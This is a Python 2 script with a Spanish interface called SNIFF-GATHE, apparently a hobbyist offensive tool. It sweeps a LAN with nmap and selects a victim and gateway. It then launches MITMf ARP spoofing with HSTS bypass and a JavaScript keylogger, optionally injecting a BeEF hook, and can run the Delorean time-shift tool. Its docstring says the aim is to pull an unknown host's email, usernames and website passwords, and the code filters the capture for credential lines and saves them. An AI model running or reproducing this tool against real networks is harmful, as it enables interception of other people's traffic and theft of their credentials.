#!/usr/bin/env python
# -*- encoding: utf-8 -*-


'''S N I F F - G A T H E     

Es un script ideado por Naivenom escrito en shell script y más tarde programado en python por Vasco, para automatizar las herramientas de escaneo como Nmap y Man in the Middle como MITMF.
El objetivo de la herramienta es el uso en una red LAN. A traves de una IP privada, donde no sabemos nada sobre ese host,
poder sacar su correo electronico, usuarios y contraseñas de sitios web.
Primero escaneamos la red con nmap, luego seleccionamos la IP donde se quiere esnifar el trafico y el gateway de la red (router).
Seleccionamos nuestra interfaz (ethernet, wlan, etc...).Por ultimo ejecutamos MITMf de la opcion 6 (herramienta escrita en python).
Es importante ir actualizando esta ventana, para ver nuevos resultados. '''


import os

ip_mask = ""
gateway = ""
target = ""
interface = ""


def logo():  # LOGO
    print chr(27) + "[1;31m" + "\n                   /\                    " + chr(27) + "[0m"
    print chr(27) + "[1;31m" + " ___/\____________/  \____________/\____ " + chr(27) + "[0m"
    print chr(27) + "[1;32m" + "   SNIFF-GATHE             by NAIVENOM   " + chr(27) + "[0m"
    print chr(27) + "[0;33m" + " ::::::::::::::::::::::::::::::::::::::  \n" + chr(27) + "[0m"


def check_file(file):  # COMPROBAR SI EXISTE ARCHIVO
    if os.path.exists(file):
        return True
    else:
        return False


def menu():
    print chr(27) + "[4;31m" + chr(27) + "[1;31m" + " Selecciona una opción \n" + chr(27) + "[0m"
    if len(ip_mask) == 0:
        print chr(27) + "[1;36m" + " 1. Seleccionar red" + chr(27) + "[0m"
    else:
        print chr(27) + "[0;36m" + " 1. Red seleccionada: %s" % ip_mask + chr(27) + "[0m"

    if target != "":
        print chr(27) + "[0;36m" + " 2. Escanear red"
    else:
        print chr(27) + "[1;36m" + " 2. Escanear red"

    if target == "":
        print chr(27) + "[1;36m" + " 3. Seleccionar Target" + chr(27) + "[0m"
    else:
        print chr(27) + "[0;36m" + " 3. Target seleccionado: %s" % target + chr(27) + "[0m"

    if interface == "":
        print chr(27) + "[1;36m" + " 4. Interface"
    else:
        print chr(27) + "[0;36m" + " 4. Interface: %s" % interface + chr(27) + "[0m"

    print chr(27) + "[1;36m" + " 5. Mostrar configuracion\n" + chr(27) + "[0m"

    if ip_mask != "" and target != "" and gateway != "":
        print chr(27) + "[1;32m" + " 6. MITMf"
        print chr(27) + "[1;32m" + " 7. MITMf + BeeF"
        print chr(27) + "[1;32m" + " 8. Delorean" + chr(27) + "[0m"
    else:
        print chr(27) + "[0;32m" + " 6. MITMf"
        print chr(27) + "[0;32m" + " 7. MITMf + BeeF"
        print chr(27) + "[0;32m" + " 8. Delorean" + chr(27) + "[0m"

    if check_file("/tmp/captura_MITMf") or check_file("/tmp/captura_BeEF"):
        print chr(27) + "[1;31m" + "\n 9. Credenciales obtenidos"
        print " 10. Ver captura completa" + chr(27) + "[0m"
    else:
        print chr(27) + "[0;31m" + "\n 9. Credenciales obtenidos"
        print " 10. Ver captura completa" + chr(27) + "[0m"

    print chr(27) + "[0;33m" + "\n 11. Instalar MITMf"
    print " 12. Instalar Delorean (GitHub)"
    print " 13. Instalar Nmap" + chr(27) + "[0m"

    print chr(27) + "[0;31m" + "\n 0. Salir" + chr(27) + "[0m"


def limpiar():  # LIMPIA PANTALLA
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def check_interfaces():  # INTERFACES DE RED DISPONIBLES
    try:
        print (chr(27) + "[0;36m" + "\n [+]Interfaces disponibles: \n" + chr(27) + "[0m")
        if check_file("/tmp/interfaces"):
            os.remove("/tmp/interfaces")
        os.system("ifconfig -s >> /tmp/interfaces")
        ifaces = []
        with open("/tmp/interfaces", "r") as myfile:
            for linea in myfile.readlines():
                iface = linea.split(" ")[0]
                ifaces.append(iface)
            ifaces.remove("Iface")
    except:
        print chr(27) + "[1;31m" + "\n[!]Error!!\n" + chr(27) + "[0m"
    finally:
        for x in ifaces:
            print (chr(27) + "[0;36m" + "  " + x + chr(27) + "[0m")


def red_scan(ip_mask):  # ESCANEA RED EN BUSCA DE OBJETIVOS
    try:
        print (chr(27) + "[0;36m""\n [+]Escaneando red...\n") + chr(27) + "[0m"
        if check_file("/tmp/hosts_list"):
            os.remove("/tmp/hosts_list")
        os.system("nmap -sn %s >> /tmp/hosts_list" % (ip_mask))
        hosts = []
        with open("/tmp/hosts_list", "r") as myfile:
            for linea in myfile.readlines():
                if "Nmap scan" in linea:
                    linea = linea.replace("\n", "")
                    host = linea.split(" ")[4]
                    hosts.append(host)
    except:
        print chr(27) + "[1;31m" + "\n[!]Error!!\n" + chr(27) + "[0m"
    finally:
        if check_file("/tmp/hosts_list"):
            os.remove("/tmp/hosts_list")
        for host in hosts:
            print (chr(27) + "[0;32m" + "   " + host) + chr(27) + "[0m"
            with open("/tmp/hosts_list", "a") as myfile:
                myfile.write(" " + host + "\n")
        raw_input("\npulsa enter para continuar...")


def ver_cred(archivo):  # VER CREDENCIALES
    try:
        print ("\n [+]Credenciales obtenidos: \n")
        credenciales = []
        keys = ["password", "username", "nick"]  # Añadir mas palabras si fuera necesario
        if check_file(archivo):
            with open(archivo, "r") as myfile, open("/tmp/credenciales", "a") as myfile2:
                for linea in myfile.readlines():
                    for key in keys:
                        if key in linea:
                            linea = linea[:-1]
                            data = linea.split(":")[5:]
                            credenciales.append(data)
                for x in credenciales:
                    myfile2.write(str(x) + "\n")
                    print x
        else:
            print (chr(27) + "[1;31m" + "\n [!]No se ha realizado el ataque!!" + chr(27) + "[0m")
    except:
        print chr(27) + "[1;31m" + "\n[!]Error!!\n" + chr(27) + "[0m"
    finally:
        raw_input("\npulsa enter para continuar...")


def ver_captura(archivo):  # LEE UN ARCHIVO Y LO MUESTRA
    if check_file(archivo):
        with open(archivo, "r") as myfile:
            print (myfile.read())
    else:
        print (chr(27) + "[1;31m" + "\n [!]No existe el archivo!!" + chr(27) + "[0m")
    raw_input(chr(27) + "[0m" + "\npulsa enter para continuar...")


while True:
    limpiar()
    logo()
    menu()

    opcionMenu = raw_input("\n Indica una opcion >> ")

    if opcionMenu == "1":  # SELECCIONAR RED
        ip_mask = raw_input(chr(27) + "[0;36m" + "\n [+]Introduce IP/MASK: " + chr(27) + "[0m")
        print (chr(27) + "[0;36m" + "\n  IP/MASK: %s" % ip_mask + chr(27) + "[0m")

        gateway = raw_input(chr(27) + "[0;36m" + "\n [+]Introduce el Gateway: " + chr(27) + "[0m")
        print (chr(27) + "[0;36m" + "\n  Gateway: %s" % gateway) + chr(27) + "[0m"
        raw_input("\npulsa enter para continuar...")

    elif opcionMenu == "2":  # ESCANEAR HOSTS
        red_scan(ip_mask)

    elif opcionMenu == "3":  # SELECCIONAR TARGET
        print (chr(27) + "[0;36m" + "\n [+]Lista de hosts detectados: \n")
        if check_file("/tmp/hosts_list"):
            with open("/tmp/hosts_list", "r") as myfile:
                for linea in myfile.readlines():
                    print "  " + linea
        target = raw_input("\n [-]Selecciona un objetivo: " + chr(27) + "[0m")
        print (chr(27) + "[0;36m" + "\n Target seleccionado: %s" % target) + chr(27) + "[0m"
        raw_input("\npulsa enter para continuar...")

    elif opcionMenu == "4":  # SELECCIONAR INTERFACE
        check_interfaces()
        interface = raw_input(chr(27) + "[0;36m" + "\n [+]Selecciona interface: " + chr(27) + "[0m")
        print (chr(27) + "[0;36m" + "\n Interface seleccionada: %s" % interface) + chr(27) + "[0m"
        raw_input("\npulsa enter para continuar...")

    elif opcionMenu == "5":  # MOSTRAR CONFIGURACION
        print (chr(27) + "[0;36m" + "\n [+]Configuracion establecida: \n")
        print ("   [-]Objetivo: %s" % target)
        print ("   [-]Gateway: %s" % gateway)
        print ("   [-]Interface: %s" % interface) + chr(27) + "[0m"
        raw_input("\npulsa enter para continuar...")

    elif opcionMenu == "6":  # MITMF
        try:
            folder = raw_input(chr(27) + "[0;32m" + "\n [+]Escribe el directorio de MITMf (terminado en /): " + chr(27) + "[0m")
            #raw_input("\n [!]Se abrira otra consola para ver los resultados.\n pulsa enter para continuar...")
            os.chdir(os.path.dirname(folder))
            #os.system("gnome-terminal -e \"python sniff-gathe.py\"")
            print (chr(27) + "[0;32m" + "\n [+]Capturando posibles usuarios y contraseñas...\n")
            os.system("python mitmf.py --spoof --arp -i %s --targets %s --gateway %s --hsts --jskeylogger | tee /tmp/captura_MITMf" % (interface, target, gateway))
        except:
            print chr(27) + "[1;31m" + "\n[!]Error!!\n" + chr(27) + "[0m"
        finally:
            raw_input(chr(27) + "[0m" + "\npulsa enter para continuar...")

    elif opcionMenu == "7":  # MITMf + BeeF
        try:
            folder = raw_input(chr(27) + "[0;32m" + "\n [+]Escribe el directorio de MITMf (terminado en /): " + chr(27) + "[0m")
            print (chr(27) + "[0;32m" + "\n [+]Inyectando hook...\n")
            os.chdir(os.path.dirname(folder))
            os.system("python mitmf.py --spoof --arp -i %s --targets %s --gateway %s --hsts --jskeylogger --inject --js-url http://127.0.0.1:3000/hook.js | tee /tmp/captura_BeEF" % (interface, target, gateway))
        except:
            print chr(27) + "[1;31m" + "\n[!]Error!!\n" + chr(27) + "[0m"
        finally:
            raw_input(chr(27) + "[0m" + "\npulsa enter para continuar...")

    elif opcionMenu == "8":  # DELOREAN
        try:
            folder = raw_input(chr(27) + "[0;32m" + "\n [+]Escribe el directorio de Delorean (terminado en /): " + chr(27) + "[0m")
            os.chdir(os.path.dirname(folder))
            print (chr(27) + "[0;32m" + "\n [-]Saltando en el tiempo...\n")
            os.system("./delorean.py")
        except:
            print chr(27) + "[1;31m" + "\n[!]Error!!\n" + chr(27) + "[0m"
        finally:
            raw_input(chr(27) + "[0m" + "\npulsa enter para continuar...")

    elif opcionMenu == "9":  # VER CREDENCIALES
        print (chr(27) + "[0;31m" + "\n [+]Tipos de ataque: \n")
        print (" 1. MITMf" + "\n 2. MITMf + BeEF")
        opcion = raw_input("\n [+]Indica la forma de ataque usada (1-2): " + chr(27) + "[0m")
        print chr(27) + "[0;32m"
        if opcion == "1":
            ver_cred("/tmp/captura_MITMf")
        elif opcion == "2":
            ver_cred("/tmp/captura_BeEF")
        else:
            print chr(27) + "[1;31m" + "\n[!]OPCION INCORRECTA!!\n" + chr(27) + "[0m"

    elif opcionMenu == "10":  # CAPTURA COMPLETA
        print (chr(27) + "[0;31m""\n [+]Tipos de ataque: \n")
        print (" 1. MITMf" + "\n 2. MITMf + BeEF")
        opcion = raw_input("\n [+]Indica la forma de ataque usada (1-2): " + chr(27) + "[0m")
        print chr(27) + "[0;32m"
        if opcion == "1":
            ver_captura("/tmp/captura_MITMf")
        elif opcion == "2":
            ver_captura("/tmp/captura_BeEF")
        else:
            print chr(27) + "[1;31m" + "\n[!]OPCION INCORRECTA!!\n" + chr(27) + "[0m"

    elif opcionMenu == "11":  # INSTALA MITMF (REPOSITORIOS/GITHUB)
        try:
            print (chr(27) + "[0;33m" + "\n [+]Instalacion de MITMf")
            print (chr(27) + "[0;31m" + " [!]Es necesario tener actualizados y añadidos los repositorios.")
            install_path = raw_input(chr(27) + "[0;33m" + "\n [-]Elige el directorio de instalacion (terminado en /): " + chr(27) + "[0m")
            print (chr(27) + "[0;33m" + "\n [-]Origenes de instalacion: ")
            print ("  1. Repositorios.\n  2. GitHub (Recomendado).")
            opcion = raw_input("\n [-]Elige el origen: " + chr(27) + "[0m")
            os.chdir(os.path.dirname(install_path))
            if opcion == "1":  # Repositorios
                print (chr(27) + "[0;33m" + "\n [-]Instalacion desde los repositorios:") + chr(27) + "[0;32m"
                os.system("apt-get install mitmf")
            elif opcion == "2":  # GitHub
                print (chr(27) + "[0;33m" + "\n [-]Instalacion desde GitHub:")
                print ("\n [-]Instalando paquetes necesarios...\n") + chr(27) + "[0;32m"
                os.system("apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file")
                print (chr(27) + "[0;33m" + "\n [-]Instalando MITMf...\n") + chr(27) + "[0;32m"
                os.system("git clone https://github.com/byt3bl33d3r/MITMf")
                os.chdir(os.path.dirname("MITMf/"))
                print (chr(27) + "[0;33m" + "\n [-]Clonando modulos...\n") + chr(27) + "[0;32m"
                os.system("git submodule init && git submodule update --recursive")
                print (chr(27) + "[0;33m" + "\n [-]Instalando dependencias...\n") + chr(27) + "[0;32m"
                os.system("pip install -r requirements.txt")
            else:
                print chr(27) + "[1;31m" + "\n[!]OPCION INCORRECTA!!\n" + chr(27) + "[0m"
        except:
            print chr(27) + "[1;31m" + "\n[!]Error!!\n" + chr(27) + "[0m"
        finally:
            raw_input(chr(27) + "[0m" + "\npulsa enter para continuar...")

    elif opcionMenu == "12":  # INSTALAR DELOREAN
        print (chr(27) + "[0;33m" + "\n [+]Instalacion de Delorean")
        print (chr(27) + "[0;31m" + " [!]Es necesario tener actualizados y añadidos los repositorios.\n") + chr(27) + "[0m"
        install_path = raw_input(chr(27) + "[0;33m" + "\n [-]Elige el directorio de instalacion (terminado en /): " + chr(27) + "[0m")
        os.chdir(os.path.dirname(install_path))
        print (chr(27) + "[0;33m" + "\n [-]Instalando...") + chr(27) + "[0;32m"
        os.system("git clone https://github.com/PentesterES/Delorean.git")
        raw_input(chr(27) + "0m" + "\npulsa enter para continuar...")

    elif opcionMenu == "13":  # INSTALAR NMAP
        print (chr(27) + "[0;33m" + "\n [+]Instalacion de nmap...")
        print (chr(27) + "[0;31m" + " [!]Es necesario tener actualizados y añadidos los repositorios.\n") + chr(27) + "[0;32m"
        os.system("apt-get install nmap")
        raw_input(chr(27) + "[0m" + "\npulsa enter para continuar...")

    elif opcionMenu == "0":  # SALIR
        respuesta = raw_input(chr(27) + "[1;31m" + "\n [!]Borrar los archivos generados? (s/n): ")
        if respuesta == "s" or respuesta == "S":
            if check_file("/tmp/hosts_list"):
                os.remove("/tmp/hosts_list")
            if check_file("/tmp/interfaces"):
                os.remove("/tmp/interfaces")
            if check_file("/tmp/captura_MITMf"):
                os.remove("/tmp/captura_MITMf")
            if check_file("/tmp/captura_BeEF"):
                os.remove("/tmp/captura_BeEF")
            if check_file("/tmp/credenciales"):
                os.remove("/tmp/credenciales")
            print (" [!]Archivos borrados") + chr(27) + "[0m"
            break
        else:
            break
    else:
        print chr(27) + "[1;31m" + "\n[!]OPCION INCORRECTA!!\n" + chr(27) + "[0m"
        raw_input("\npulsa enter para continuar...")
